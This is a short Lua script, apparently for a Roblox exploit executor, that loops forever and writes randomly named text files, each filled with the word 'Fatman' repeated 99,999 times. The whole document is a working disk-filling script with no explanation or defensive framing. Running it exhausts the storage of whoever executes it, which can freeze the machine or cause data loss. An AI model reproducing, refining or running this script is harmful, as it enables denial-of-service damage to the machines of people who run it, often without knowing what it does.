function generate(nums)      
local randomtext = ""
        for i = 1,nums do
            randomtext = randomtext..string.char(math.random(97,122))
        end
    writefile(randomtext..".txt",string.rep("Fatman",99999))
end
         
         
while true do 
    generate(12)
    wait()
end 
